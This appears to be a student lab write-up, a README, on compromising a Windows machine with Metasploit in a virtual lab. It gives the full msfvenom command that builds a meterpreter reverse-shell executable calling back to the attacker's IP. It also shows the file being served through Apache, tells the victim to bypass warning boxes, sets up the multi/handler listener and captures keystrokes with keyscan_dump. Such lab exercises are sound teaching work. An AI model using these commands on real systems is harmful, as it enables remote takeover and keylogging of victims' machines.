# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

## OUTPUT:
![alt text](ifconfig.png)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![alt text](<VirtualBox_Parrot Security 6.0_19_04_2025_22_11_04.png>)

copy the fun.exe into the apache /var/www/html folder
![alt text](fun.png)

Start apache server sudo systemctl apache2 start
![alt text](Apaches.png)

Check the status of apache2
![alt text](<apache sta.png>)

Invoke msfconsole:
## OUTPUT:
![alt text](msfconsole.png)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![alt text](help.png)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![alt text](<VirtualBox_Parrot Security 6.0_19_04_2025_22_31_48.png>)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![alt text](VirtualBox_windows7_20_04_2025_12_42_34.png)


Bypass any warning boxes, double-click the file, and allow it to run.

![alt text](VirtualBox_windows7_20_04_2025_12_43_42.png)

On kali give the command exploit

![alt text](exploit.png)

keyscan_dump	Shows the keystrokes captured so far
![VirtualBox_Parrot Security 6 0_25_05_2025_12_55_07](https://github.com/user-attachments/assets/7e28f1c3-38ba-4a0f-901a-166a3ed2e6c9)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
